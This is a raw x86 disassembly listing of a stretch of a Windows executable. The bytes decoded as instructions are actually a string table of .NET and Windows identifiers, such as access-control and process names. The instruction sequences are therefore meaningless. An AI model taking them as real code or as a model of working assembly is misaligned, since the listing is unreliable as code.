  409ddc:	outs   dx,BYTE PTR ds:[esi]
  409ddd:	add    BYTE PTR [bx+0x65],ah
  409de1:	je     0x409e42
  409de3:	push   edi
  409de4:	popa   
  409de5:	jb     0x409e55
  409de7:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  409dee:	pop    edi
  409def:	push   edi
  409df0:	imul   ebp,DWORD PTR [esi+0x64],0x4773776f
  409df7:	jb     0x409e68
  409df9:	jne    0x409e6b
  409dfb:	add    BYTE PTR [edi+0x65],ah
  409dfe:	je     0x409e5f
  409e00:	push   edi
  409e01:	imul   ebp,DWORD PTR [esi+0x64],0x5573776f
  409e08:	jae    0x409e6f
  409e0a:	jb     0x409e0c
  409e0c:	inc    ebx
  409e0d:	jne    0x409e7b
  409e0f:	je     0x409e86
  409e11:	jb     0x409e78
  409e13:	add    BYTE PTR [ecx+0x43],al
  409e16:	dec    esp
  409e17:	dec    edi
  409e18:	outs   dx,BYTE PTR ds:[esi]
  409e19:	dec    edi
  409e1a:	bound  ebp,QWORD PTR [edx+0x65]
  409e1d:	arpl   WORD PTR [eax+eax*1+0x41],si
  409e21:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x65636341
  409e2a:	jae    0x409e9f
  409e2c:	inc    ebx
  409e2d:	outs   dx,DWORD PTR ds:[esi]
  409e2e:	outs   dx,BYTE PTR ds:[esi]
  409e2f:	je     0x409ea3
  409e31:	outs   dx,DWORD PTR ds:[esi]
  409e32:	ins    BYTE PTR es:[edi],dx
  409e33:	inc    ebp
  409e34:	outs   dx,BYTE PTR ds:[esi]
  409e35:	je     0x409ea9
  409e37:	jns    0x409e39
  409e39:	inc    ecx
  409e3a:	fs imul ebp,DWORD PTR fs:[esi+0x67],0x626d654d
  409e43:	gs jb  0x409e9a
  409e46:	outs   dx,DWORD PTR ds:[esi]
  409e47:	inc    edi
  409e48:	jb     0x409eb9
  409e4a:	jne    0x409ebc
  409e4c:	add    BYTE PTR [ecx+0x4d],al
  409e4f:	gs ins DWORD PTR es:[edi],dx
  409e51:	bound  esp,QWORD PTR [ebp+0x72]
  409e54:	dec    edi
  409e55:	data16 add BYTE PTR [ebx+0x61],al
  409e59:	jo     0x409ec4
  409e5b:	je     0x409ebe
  409e5d:	ins    BYTE PTR es:[edi],dx
  409e5e:	push   esp
  409e5f:	inc    esi
  409e60:	push   ebx
  409e61:	inc    ecx
  409e62:	jo     0x409ed4
  409e64:	ins    BYTE PTR es:[edi],dx
  409e65:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409e6c:	inc    edi
  409e6d:	jb     0x409ede
  409e6f:	jne    0x409ee1
  409e71:	add    BYTE PTR [ebx+0x68],al
  409e74:	popa   
  409e75:	outs   dx,BYTE PTR ds:[esi]
  409e76:	imul   ebp,DWORD PTR [bp+0x67],0x6c707041
  409e7e:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409e85:	inc    edi
  409e86:	jb     0x409ef7
  409e88:	jne    0x409efa
  409e8a:	inc    esp
  409e8b:	gs jae 0x409ef1
  409e8e:	jb     0x409ef9
  409e90:	jo     0x409f06
  409e92:	imul   ebp,DWORD PTR [edi+0x6e],0x65684300
  409e99:	arpl   WORD PTR [ebx+0x69],bp
  409e9c:	outs   dx,BYTE PTR ds:[esi]
  409e9d:	addr16 inc edi
  409e9f:	jb     0x409f10
  409ea1:	jne    0x409f13
  409ea3:	dec    ebp
  409ea4:	gs ins DWORD PTR es:[edi],dx
  409ea6:	bound  esp,QWORD PTR [ebp+0x72]
  409ea9:	jae    0x409f13
  409eab:	imul   esi,DWORD PTR [eax+0x0],0x79706f43
  409eb2:	jb     0x409f1d
  409eb4:	addr16 push 0x61745374
  409eba:	je     0x409f21
  409ebc:	ins    DWORD PTR es:[edi],dx
  409ebd:	outs   dx,BYTE PTR gs:[esi]
  409ebf:	je     0x409ec1
  409ec1:	inc    ebx
  409ec2:	jb     0x409f29
  409ec4:	popa   
  409ec5:	je     0x409f30
  409ec7:	outs   dx,BYTE PTR ds:[esi]
  409ec8:	addr16 inc edi
  409eca:	ins    BYTE PTR es:[edi],dx
  409ecb:	outs   dx,DWORD PTR ds:[esi]
  409ecc:	bound  esp,QWORD PTR [ecx+0x6c]
  409ecf:	inc    ecx
  409ed0:	jo     0x409f42
  409ed2:	ins    BYTE PTR es:[edi],dx
  409ed3:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409eda:	inc    edi
  409edb:	jb     0x409f4c
  409edd:	jne    0x409f4f
  409edf:	add    BYTE PTR [ebx+0x72],al
  409ee2:	gs popa 
  409ee4:	je     0x409f4f
  409ee6:	outs   dx,BYTE PTR ds:[esi]
  409ee7:	addr16 dec esp
  409ee9:	outs   dx,DWORD PTR ds:[esi]
  409eea:	arpl   WORD PTR [ecx+0x6c],sp
  409eed:	inc    ecx
  409eee:	jo     0x409f60
  409ef0:	ins    BYTE PTR es:[edi],dx
  409ef1:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409ef8:	inc    edi
  409ef9:	jb     0x409f6a
  409efb:	jne    0x409f6d
  409efd:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  409f01:	gs je  0x409f6d
  409f04:	outs   dx,BYTE PTR ds:[esi]
  409f05:	addr16 inc ecx
  409f07:	jo     0x409f79
  409f09:	ins    BYTE PTR es:[edi],dx
  409f0a:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409f11:	inc    edi
  409f12:	jb     0x409f83
  409f14:	jne    0x409f86
  409f16:	add    BYTE PTR [ebp+eiz*2+0x73],al
  409f1a:	arpl   WORD PTR [edx+0x69],si
  409f1d:	jo     0x409f93
  409f1f:	imul   ebp,DWORD PTR [edi+0x6e],0x73694400
  409f26:	jo     0x409f94
  409f28:	popa   
  409f29:	jns    0x409f79
  409f2b:	popa   
  409f2c:	ins    DWORD PTR es:[edi],dx
  409f2d:	add    BYTE PTR gs:[edi+ebp*2+0x6e],al
  409f32:	add    BYTE PTR gs:[ebp+0x6d],al
  409f36:	jo     0x409fac
  409f38:	jns    0x409f7d
  409f3a:	outs   dx,DWORD PTR ds:[esi]
  409f3b:	ins    DWORD PTR es:[edi],dx
  409f3c:	ins    DWORD PTR es:[edi],dx
  409f3d:	popa   
  409f3e:	outs   dx,BYTE PTR ds:[esi]
  409f3f:	fs push eax
  409f41:	popa   
  409f42:	jb     0x409fa5
  409f44:	ins    DWORD PTR es:[edi],dx
  409f45:	gs je  0x409fad
  409f48:	jb     0x409f4a
  409f4a:	inc    ebp
  409f4b:	ins    DWORD PTR es:[edi],dx
  409f4c:	jo     0x409fc2
  409f4e:	jns    0x409f93
  409f50:	outs   dx,DWORD PTR ds:[esi]
  409f51:	ins    DWORD PTR es:[edi],dx
  409f52:	ins    DWORD PTR es:[edi],dx
  409f53:	popa   
  409f54:	outs   dx,BYTE PTR ds:[esi]
  409f55:	fs push ebx
  409f57:	ja     0x409fc2
  409f59:	je     0x409fbe
  409f5b:	push   0x6f6e6749
  409f60:	jb     0x409fc7
  409f62:	add    BYTE PTR fs:[ebp+0x6d],al
  409f66:	jo     0x409fdc
  409f68:	jns    0x409fad
  409f6a:	outs   dx,DWORD PTR ds:[esi]
  409f6b:	ins    DWORD PTR es:[edi],dx
  409f6c:	ins    DWORD PTR es:[edi],dx
  409f6d:	popa   
  409f6e:	outs   dx,BYTE PTR ds:[esi]
  409f6f:	fs push ebx
  409f71:	ja     0x409fdc
  409f73:	je     0x409fd8
  409f75:	push   0x68746957
  409f7a:	inc    esp
  409f7b:	outs   dx,DWORD PTR ds:[esi]
  409f7c:	ins    DWORD PTR es:[edi],dx
  409f7d:	popa   
  409f7e:	imul   ebp,DWORD PTR [esi+0x49],0x726f6e67
  409f85:	gs add BYTE PTR fs:[ebp+0x6d],al
  409f8a:	jo     0x40a000
  409f8c:	jns    0x409fe1
  409f8e:	ja     0x409ff9
  409f90:	je     0x409ff5
  409f92:	push   0x45007365
  409f97:	jb     0x40a00b
  409f99:	outs   dx,DWORD PTR ds:[esi]
  409f9a:	jb     0x409f9c
  409f9c:	inc    edi
  409f9d:	ins    BYTE PTR es:[edi],dx
  409f9e:	outs   dx,DWORD PTR ds:[esi]
  409f9f:	bound  esp,QWORD PTR [ecx+0x6c]
  409fa2:	add    BYTE PTR [edi+0x72],al
  409fa5:	outs   dx,DWORD PTR ds:[esi]
  409fa6:	jne    0x40a018
  409fa8:	push   esp
  409fa9:	jns    0x40a01b
  409fab:	add    BYTE PTR gs:[eax+0x65],cl
  409faf:	ins    BYTE PTR es:[edi],dx
  409fb0:	jo     0x409ff5
  409fb2:	outs   dx,DWORD PTR ds:[esi]
  409fb3:	ins    DWORD PTR es:[edi],dx
  409fb4:	ins    DWORD PTR es:[edi],dx
  409fb5:	popa   
  409fb6:	outs   dx,BYTE PTR ds:[esi]
  409fb7:	fs jae 0x409fba
  409fba:	dec    eax
  409fbb:	gs ins BYTE PTR es:[edi],dx
  409fbd:	jo     0x40a003
  409fbf:	outs   dx,DWORD PTR ds:[esi]
  409fc0:	ins    DWORD PTR es:[edi],dx
  409fc1:	popa   
  409fc2:	imul   ebp,DWORD PTR [esi+0x0],0x706c6548
  409fc9:	dec    ecx
  409fca:	fs outs dx,BYTE PTR gs:[esi]
  409fcd:	je     0x40a038
  409fcf:	je     0x40a04a
  409fd1:	add    BYTE PTR [eax+0x65],cl
  409fd4:	ins    BYTE PTR es:[edi],dx
  409fd5:	jo     0x40a02a
  409fd7:	arpl   WORD PTR gs:[ebp+0x72],si
  409fdb:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x706c6548
  409fe3:	push   esp
  409fe4:	jns    0x40a056
  409fe6:	gs jae 0x409fe9
  409fe9:	dec    ecx
  409fea:	fs outs dx,BYTE PTR gs:[esi]
  409fed:	je     0x40a058
  409fef:	je     0x40a06a
  409ff1:	inc    ebx
  409ff2:	popa   
  409ff3:	outs   dx,BYTE PTR ds:[esi]
  409ff4:	outs   dx,BYTE PTR ds:[esi]
  409ff5:	outs   dx,DWORD PTR ds:[esi]
  409ff6:	je     0x40a03a
  409ff8:	gs push edx
  409ffa:	gs jae 0x40a06c
  409ffd:	ins    BYTE PTR es:[edi],dx
  409ffe:	jbe    0x40a065
  40a000:	add    BYTE PTR fs:[ecx+0x64],cl
  40a004:	outs   dx,BYTE PTR gs:[esi]
  40a006:	je     0x40a071
  40a008:	je     0x40a083
  40a00a:	push   esp
  40a00b:	jns    0x40a07d
  40a00d:	add    BYTE PTR gs:[ecx+0x6e],cl
  40a011:	jae    0x40a088
  40a013:	data16 imul sp,WORD PTR [ebx+0x69],0x6e65
  40a01a:	je     0x40a06a
  40a01c:	jne    0x40a08b
  40a01e:	bound  esp,QWORD PTR [ebp+0x72]
  40a021:	dec    edi
  40a022:	push   ax
  40a024:	popa   
  40a025:	jb     0x40a088
  40a027:	ins    DWORD PTR es:[edi],dx
  40a028:	gs je  0x40a090
  40a02b:	jb     0x40a0a0
  40a02d:	add    BYTE PTR [ecx+0x6e],cl
  40a030:	jbe    0x40a093
  40a032:	ins    BYTE PTR es:[edi],dx
  40a033:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x6c61766e
  40a03b:	imul   esp,DWORD PTR [ecx+eax*2+0x63],0x73736563
  40a043:	inc    ebx
  40a044:	outs   dx,DWORD PTR ds:[esi]
  40a045:	outs   dx,BYTE PTR ds:[esi]
  40a046:	je     0x40a0ba
  40a048:	outs   dx,DWORD PTR ds:[esi]
  40a049:	ins    BYTE PTR es:[edi],dx
  40a04a:	inc    ebp
  40a04b:	js     0x40a0b0
  40a04d:	gs jo  0x40a0c4
  40a050:	imul   ebp,DWORD PTR [edi+0x6e],0x766e4900
  40a057:	popa   
  40a058:	ins    BYTE PTR es:[edi],dx
  40a059:	imul   esp,DWORD PTR [ecx+eax*2+0x63],0x6e6f6974
  40a061:	add    BYTE PTR [ecx+0x6e],cl
  40a064:	jbe    0x40a0c7
  40a066:	ins    BYTE PTR es:[edi],dx
  40a067:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  40a06f:	fs push ebx
  40a071:	ja     0x40a0dc
  40a073:	je     0x40a0d8
  40a075:	push   0x6f6e6749
  40a07a:	jb     0x40a0e1
  40a07c:	add    BYTE PTR fs:[ecx+0x6e],cl
  40a080:	jbe    0x40a0e3
  40a082:	ins    BYTE PTR es:[edi],dx
  40a083:	imul   esp,DWORD PTR [esi+ecx*2+0x6f],0x76726553
  40a08b:	gs jb  0x40a08e
  40a08e:	dec    ecx
  40a08f:	outs   dx,BYTE PTR ds:[esi]
  40a090:	jbe    0x40a0f3
  40a092:	ins    BYTE PTR es:[edi],dx
  40a093:	imul   esp,DWORD PTR [edx+edx*2+0x65],0x6e727574
  40a09b:	gs fs dec ecx
  40a09e:	fs outs dx,BYTE PTR gs:[esi]
  40a0a1:	je     0x40a10c
  40a0a3:	je     0x40a11e
  40a0a5:	add    BYTE PTR [ecx+0x6e],cl
  40a0a8:	jbe    0x40a10b
  40a0aa:	ins    BYTE PTR es:[edi],dx
  40a0ab:	imul   esp,DWORD PTR [ebx+edx*2+0x77],0x68637469
  40a0b3:	gs jae 0x40a0ff
  40a0b6:	outs   dx,BYTE PTR ds:[si]
  40a0b8:	outs   dx,DWORD PTR ds:[esi]
  40a0b9:	jb     0x40a120
  40a0bb:	add    BYTE PTR fs:[ecx+0x73],cl
  40a0bf:	add    BYTE PTR [ecx+0x73],cl
  40a0c2:	dec    esi
  40a0c3:	outs   dx,DWORD PTR ds:[esi]
  40a0c4:	je     0x40a0c6
  40a0c6:	dec    esp
  40a0c7:	gs addr16 popa 
  40a0ca:	ins    BYTE PTR es:[edi],dx
  40a0cb:	push   ebx
  40a0cc:	je     0x40a12f
  40a0ce:	je     0x40a135
  40a0d0:	ins    DWORD PTR es:[edi],dx
  40a0d1:	outs   dx,BYTE PTR gs:[esi]
  40a0d3:	je     0x40a0d5
  40a0d5:	dec    esp
  40a0d6:	outs   dx,DWORD PTR ds:[esi]
  40a0d7:	outs   dx,DWORD PTR ds:[si]
  40a0d9:	outs   dx,BYTE PTR ds:[esi]
  40a0da:	dec    esi
  40a0db:	popa   
  40a0dc:	ins    DWORD PTR es:[edi],dx
  40a0dd:	add    BYTE PTR gs:[ebp+0x61],cl
  40a0e1:	imul   ebp,DWORD PTR [ecx+eax*2+0x64],0x73657264
  40a0e9:	jae    0x40a0eb
  40a0eb:	dec    ebp
  40a0ec:	gs ins DWORD PTR es:[edi],dx
  40a0ee:	bound  esp,QWORD PTR [ebp+0x72]
  40a0f1:	dec    edi
  40a0f2:	data16 add BYTE PTR [ebp+0x65],cl
  40a0f6:	ins    DWORD PTR es:[edi],dx
  40a0f7:	bound  esp,QWORD PTR [ebp+0x72]
  40a0fa:	jae    0x40a0fc
  40a0fc:	dec    esi
  40a0fd:	outs   dx,DWORD PTR ds:[esi]
  40a0fe:	inc    ebx
  40a0ff:	outs   dx,DWORD PTR ds:[esi]
  40a100:	ins    DWORD PTR es:[edi],dx
  40a101:	ins    DWORD PTR es:[edi],dx
  40a102:	popa   
  40a103:	outs   dx,BYTE PTR ds:[esi]
  40a104:	fs push esp
  40a106:	outs   dx,DWORD PTR ds:[esi]
  40a107:	inc    ebp
  40a108:	js     0x40a16f
  40a10a:	arpl   WORD PTR [ebp+0x74],si
  40a10d:	add    BYTE PTR gs:[esi+0x6f],cl
  40a111:	je     0x40a154
  40a113:	jo     0x40a185
  40a115:	ins    BYTE PTR es:[edi],dx
  40a116:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a11d:	inc    edi
  40a11e:	jb     0x40a18f
  40a120:	jne    0x40a192
  40a122:	add    BYTE PTR [esi+0x75],cl
  40a125:	ins    BYTE PTR es:[edi],dx
  40a126:	ins    BYTE PTR es:[edi],dx
  40a127:	dec    ecx
  40a128:	fs outs dx,BYTE PTR gs:[esi]
  40a12b:	je     0x40a196
  40a12d:	je     0x40a1a8
  40a12f:	add    BYTE PTR [eax+0x72],dl
  40a132:	outs   dx,DWORD PTR ds:[esi]
  40a133:	push   0x65
  40a135:	arpl   WORD PTR [ebx+edx*2+0x63],si
  40a139:	outs   dx,DWORD PTR ds:[esi]
  40a13a:	jo     0x40a1a1
  40a13c:	add    BYTE PTR [ecx+0x41],dl
  40a13f:	inc    ecx
  40a140:	jne    0x40a1b6
  40a142:	outs   dx,DWORD PTR ds:[esi]
  40a143:	ins    DWORD PTR es:[edi],dx
  40a144:	popa   
  40a145:	je     0x40a1b0
  40a147:	outs   dx,DWORD PTR ds:[esi]
  40a148:	outs   dx,BYTE PTR ds:[esi]
  40a149:	dec    ebp
  40a14a:	outs   dx,DWORD PTR ds:[esi]
  40a14b:	fs gs ins BYTE PTR es:[edi],dx
  40a14e:	inc    ebp
  40a14f:	outs   dx,BYTE PTR ds:[esi]
  40a150:	popa   
  40a151:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  40a155:	add    BYTE PTR [edx+0x65],dl
  40a158:	ins    DWORD PTR es:[edi],dx
  40a159:	outs   dx,DWORD PTR ds:[esi]
  40a15a:	jbe    0x40a1c5
  40a15c:	outs   dx,BYTE PTR ds:[esi]
  40a15d:	addr16 inc ecx
  40a15f:	arpl   WORD PTR [ebx+0x65],sp
  40a162:	jae    0x40a1d7
  40a164:	inc    ebx
  40a165:	outs   dx,DWORD PTR ds:[esi]
  40a166:	outs   dx,BYTE PTR ds:[esi]
  40a167:	je     0x40a1db
  40a169:	outs   dx,DWORD PTR ds:[esi]
  40a16a:	ins    BYTE PTR es:[edi],dx
  40a16b:	inc    ebp
  40a16c:	outs   dx,BYTE PTR ds:[esi]
  40a16d:	je     0x40a1e1
  40a16f:	jns    0x40a171
  40a171:	push   edx
  40a172:	gs ins DWORD PTR es:[edi],dx
  40a174:	outs   dx,DWORD PTR ds:[esi]
  40a175:	jbe    0x40a1e0
  40a177:	outs   dx,BYTE PTR ds:[esi]
  40a178:	addr16 dec ebp
  40a17a:	gs ins DWORD PTR es:[edi],dx
  40a17c:	bound  esp,QWORD PTR [ebp+0x72]
  40a17f:	inc    esi
  40a180:	jb     0x40a1f1
  40a182:	ins    DWORD PTR es:[edi],dx
  40a183:	inc    edi
  40a184:	jb     0x40a1f5
  40a186:	jne    0x40a1f8
  40a188:	add    BYTE PTR [edx+0x65],dl
  40a18b:	outs   dx,BYTE PTR ds:[esi]
  40a18c:	popa   
  40a18d:	ins    DWORD PTR es:[edi],dx
  40a18e:	imul   ebp,DWORD PTR [esi+0x67],0x6c707041
  40a195:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a19c:	inc    edi
  40a19d:	jb     0x40a20e
  40a19f:	jne    0x40a211
  40a1a1:	add    BYTE PTR [edx+0x65],dl
  40a1a4:	jae    0x40a215
  40a1a6:	ins    BYTE PTR es:[edi],dx
  40a1a7:	jbe    0x40a212
  40a1a9:	outs   dx,BYTE PTR ds:[esi]
  40a1aa:	addr16 dec ecx
  40a1ac:	fs outs dx,BYTE PTR gs:[esi]
  40a1af:	je     0x40a21a
  40a1b1:	je     0x40a22c
  40a1b3:	add    BYTE PTR [edx+0x65],dl
  40a1b6:	je     0x40a22a
  40a1b8:	imul   esp,DWORD PTR [ebp+0x76],0x41676e69
  40a1bf:	arpl   WORD PTR [ebx+0x65],sp
  40a1c2:	jae    0x40a237
  40a1c4:	inc    ebx
  40a1c5:	outs   dx,DWORD PTR ds:[esi]
  40a1c6:	outs   dx,BYTE PTR ds:[esi]
  40a1c7:	je     0x40a23b
  40a1c9:	outs   dx,DWORD PTR ds:[esi]
  40a1ca:	ins    BYTE PTR es:[edi],dx
  40a1cb:	dec    esp
  40a1cc:	imul   esi,DWORD PTR [ebx+0x74],0x74655200
  40a1d3:	jb     0x40a23e
  40a1d5:	gs jbe 0x40a241
  40a1d8:	outs   dx,BYTE PTR ds:[esi]
  40a1d9:	addr16 inc ecx
  40a1db:	jo     0x40a24d
  40a1dd:	ins    BYTE PTR es:[edi],dx
  40a1de:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40a1e5:	inc    edi
  40a1e6:	jb     0x40a257
  40a1e8:	jne    0x40a25a
  40a1ea:	jae    0x40a1ec
  40a1ec:	push   ebx
  40a1ed:	arpl   WORD PTR gs:[ebp+0x72],si
  40a1f1:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  40a1f9:	jo     0x40a25c
  40a1fb:	arpl   WORD PTR [ebp+0x44],sp
  40a1fe:	outs   dx,DWORD PTR ds:[esi]
  40a1ff:	gs jae 0x40a250
  40a202:	outs   dx,DWORD PTR ds:[esi]
  40a203:	je     0x40a24a
  40a205:	js     0x40a270
  40a207:	jae    0x40a27d
  40a209:	add    BYTE PTR [ebx+0x68],dl
  40a20c:	outs   dx,DWORD PTR ds:[esi]
  40a20d:	ja     0x40a250
  40a20f:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40a213:	outs   dx,BYTE PTR ds:[esi]
  40a214:	jae    0x40a216
  40a216:	push   ebx
  40a217:	push   0x614e776f
  40a21c:	ins    DWORD PTR es:[edi],dx
  40a21d:	gs jae 0x40a290
  40a220:	popa   
  40a221:	arpl   WORD PTR [ebp+0x73],sp
  40a224:	add    BYTE PTR [ebx+0x75],dl
  40a227:	jo     0x40a28e
  40a229:	jb     0x40a291
  40a22b:	ins    BYTE PTR es:[edi],dx
  40a22c:	jne    0x40a29d
  40a22e:	jne    0x40a2a3
  40a230:	inc    ebx
  40a231:	outs   dx,DWORD PTR ds:[esi]
  40a232:	ins    DWORD PTR es:[edi],dx
  40a233:	ins    DWORD PTR es:[edi],dx
  40a234:	popa   
  40a235:	outs   dx,BYTE PTR ds:[esi]
  40a236:	fs push eax
  40a238:	popa   
  40a239:	jb     0x40a29c
  40a23b:	ins    DWORD PTR es:[edi],dx
  40a23c:	gs je  0x40a2a4
  40a23f:	jb     0x40a28a
  40a241:	outs   dx,BYTE PTR ds:[si]
  40a243:	outs   dx,DWORD PTR ds:[esi]
  40a244:	jb     0x40a2ab
  40a246:	add    BYTE PTR fs:[ebx+0x75],dl
  40a24a:	jo     0x40a2b1
  40a24c:	jb     0x40a2b4
  40a24e:	ins    BYTE PTR es:[edi],dx
  40a24f:	jne    0x40a2c0
  40a251:	jne    0x40a2c6
  40a253:	inc    ebx
  40a254:	outs   dx,DWORD PTR ds:[esi]
  40a255:	ins    DWORD PTR es:[edi],dx
  40a256:	ins    DWORD PTR es:[edi],dx
  40a257:	popa   
  40a258:	outs   dx,BYTE PTR ds:[esi]
  40a259:	fs push eax
  40a25b:	popa   
  40a25c:	jb     0x40a2bf
  40a25e:	ins    DWORD PTR es:[edi],dx
  40a25f:	gs je  0x40a2c7
  40a262:	jb     0x40a2d7
  40a264:	dec    ecx
  40a265:	outs   dx,BYTE PTR ds:[si]
  40a267:	outs   dx,DWORD PTR ds:[esi]
  40a268:	jb     0x40a2cf
  40a26a:	add    BYTE PTR fs:[ebx+0x75],dl
  40a26e:	jo     0x40a2d5
  40a270:	jb     0x40a2d8
  40a272:	ins    BYTE PTR es:[edi],dx
  40a273:	jne    0x40a2e4
  40a275:	jne    0x40a2ea
  40a277:	inc    ebx
  40a278:	outs   dx,DWORD PTR ds:[esi]
  40a279:	ins    DWORD PTR es:[edi],dx
  40a27a:	ins    DWORD PTR es:[edi],dx
  40a27b:	popa   
  40a27c:	outs   dx,BYTE PTR ds:[esi]
  40a27d:	fs push ebx
  40a27f:	ja     0x40a2ea
  40a281:	je     0x40a2e6
  40a283:	push   0x6f6e6749
  40a288:	jb     0x40a2ef
  40a28a:	add    BYTE PTR fs:[ebx+0x75],dl
  40a28e:	jo     0x40a2f5
  40a290:	jb     0x40a2f8
  40a292:	ins    BYTE PTR es:[edi],dx
  40a293:	jne    0x40a304
  40a295:	jne    0x40a30a
  40a297:	inc    ebx
  40a298:	outs   dx,DWORD PTR ds:[esi]
  40a299:	ins    DWORD PTR es:[edi],dx
  40a29a:	ins    DWORD PTR es:[edi],dx
  40a29b:	popa   
  40a29c:	outs   dx,BYTE PTR ds:[esi]
  40a29d:	fs push ebx
  40a29f:	ja     0x40a30a
  40a2a1:	je     0x40a306
  40a2a3:	push   0x6f6e6749
  40a2a8:	jb     0x40a30f
  40a2aa:	fs push edi
  40a2ac:	imul   esi,DWORD PTR [eax+ebp*2+0x44],0x69616d6f
  40a2b4:	outs   dx,BYTE PTR ds:[esi]
  40a2b5:	add    BYTE PTR [ebx+0x75],dl
  40a2b8:	jo     0x40a31f
  40a2ba:	jb     0x40a322
  40a2bc:	ins    BYTE PTR es:[edi],dx
  40a2bd:	jne    0x40a32e
  40a2bf:	jne    0x40a334
  40a2c1:	push   ebx
  40a2c2:	ja     0x40a32d
  40a2c4:	je     0x40a329
  40a2c6:	push   0x6f6e6749
  40a2cb:	jb     0x40a332
  40a2cd:	add    BYTE PTR fs:[ecx+eiz*2+0x72],dl
  40a2d2:	addr16 gs je 0x40a32a
  40a2d6:	inc    esi
  40a2d7:	push   ebx
  40a2d8:	inc    esp
  40a2d9:	outs   dx,DWORD PTR ds:[esi]
  40a2da:	ins    DWORD PTR es:[edi],dx
  40a2db:	popa   
  40a2dc:	imul   ebp,DWORD PTR [esi+0x0],0x6e6b6e55
  40a2e3:	outs   dx,DWORD PTR ds:[esi]
  40a2e4:	ja     0x40a354
  40a2e6:	add    BYTE PTR [ebp+0x73],dl
  40a2e9:	imul   ebp,DWORD PTR [esi+0x67],0x68747541
  40a2f0:	outs   dx,DWORD PTR ds:[esi]
  40a2f1:	jb     0x40a35c
  40a2f3:	jp     0x40a356
  40a2f5:	je     0x40a360
  40a2f7:	outs   dx,DWORD PTR ds:[esi]
  40a2f8:	outs   dx,BYTE PTR ds:[esi]
  40a2f9:	inc    edx
  40a2fa:	arpl   WORD PTR gs:[ecx+0x75],sp
  40a2fe:	jae    0x40a365
  40a300:	dec    edi
  40a301:	inc    si
  40a303:	outs   dx,DWORD PTR ds:[esi]
  40a304:	jb     0x40a373
  40a306:	popa   
  40a307:	je     0x40a309
  40a309:	push   esi
  40a30a:	gs jb  0x40a376
  40a30d:	data16 jns 0x40a379
  40a310:	outs   dx,BYTE PTR ds:[esi]
  40a311:	add    BYTE PTR [bx+0x61],dl
  40a315:	jb     0x40a385
  40a317:	imul   ebp,DWORD PTR [esi+0x67],0x6e695700
  40a31e:	outs   dx,DWORD PTR fs:[esi]
  40a320:	ja     0x40a395
  40a322:	inc    edi
  40a323:	jb     0x40a394
  40a325:	jne    0x40a397
  40a327:	add    BYTE PTR [edi+0x69],dl
  40a32a:	outs   dx,BYTE PTR ds:[esi]
  40a32b:	outs   dx,DWORD PTR fs:[esi]
  40a32d:	ja     0x40a3a2
  40a32f:	push   ebp
  40a330:	jae    0x40a397
  40a332:	jb     0x40a334
  40a334:	imul   eax,DWORD PTR [eax],0x63736564
  40a33a:	jb     0x40a3a5
  40a33c:	jo     0x40a3b2
  40a33e:	imul   ebp,DWORD PTR [edi+0x6e],0x65636100
  40a345:	add    BYTE PTR [edi+ebp*2+0x6b],dh
  40a349:	outs   dx,BYTE PTR gs:[esi]
  40a34b:	add    BYTE PTR [ecx+0x63],ah
  40a34e:	ins    BYTE PTR es:[edi],dx
  40a34f:	add    BYTE PTR [edi+0x61],dh
  40a352:	jb     0x40a3c2
  40a354:	imul   ebp,DWORD PTR [esi+0x67],0x646900
  40a35b:	jno    0x40a3d2
  40a35d:	gs jb  0x40a3d9
  40a360:	dec    ebp
  40a361:	gs ins DWORD PTR es:[edi],dx
  40a363:	bound  esp,QWORD PTR [ebp+0x72]
  40a366:	jae    0x40a3d0
  40a368:	imul   esi,DWORD PTR [eax+0x0],0x64616572
  40a36f:	dec    ecx
  40a370:	fs outs dx,BYTE PTR gs:[esi]
  40a373:	je     0x40a3de
  40a375:	je     0x40a3f0
  40a377:	dec    edi
  40a378:	jo     0x40a3ee
  40a37a:	imul   ebp,DWORD PTR [edi+0x6e],0x72700073
  40a381:	imul   ebp,DWORD PTR [esi+0x74],0x6e656449
  40a388:	je     0x40a3f3
  40a38a:	je     0x40a405
  40a38c:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  40a390:	arpl   WORD PTR [edx+0x69],si
  40a393:	jo     0x40a409
  40a395:	outs   dx,DWORD PTR ds:[esi]
  40a396:	jb     0x40a398
  40a398:	popa   
  40a399:	jb     0x40a402
  40a39b:	jae    0x40a39d
  40a39d:	outs   dx,DWORD PTR ds:[esi]
  40a39e:	jo     0x40a405
  40a3a0:	jb     0x40a403
  40a3a2:	je     0x40a40d
  40a3a4:	outs   dx,DWORD PTR ds:[esi]
  40a3a5:	outs   dx,BYTE PTR ds:[esi]
  40a3a6:	add    BYTE PTR [ecx+0x72],ah
  40a3a9:	add    BYTE PTR [ebx+0x65],dh
  40a3ac:	arpl   WORD PTR [ebp+0x72],si
  40a3af:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  40a3b7:	jo     0x40a41a
  40a3b9:	arpl   WORD PTR [ebp+0x0],sp
  40a3bc:	push   ebx
  40a3bd:	jns    0x40a432
  40a3bf:	je     0x40a426
  40a3c1:	ins    DWORD PTR es:[edi],dx
  40a3c2:	cs push edx
  40a3c4:	jne    0x40a434
  40a3c6:	je     0x40a431
  40a3c8:	ins    DWORD PTR es:[edi],dx
  40a3c9:	gs cs dec ecx
  40a3cc:	outs   dx,BYTE PTR ds:[esi]
  40a3cd:	je     0x40a434
  40a3cf:	jb     0x40a440
  40a3d1:	jo     0x40a426
  40a3d3:	gs jb  0x40a44c
  40a3d6:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  40a3dd:	je     0x40a420
  40a3df:	je     0x40a455
  40a3e1:	jb     0x40a44c
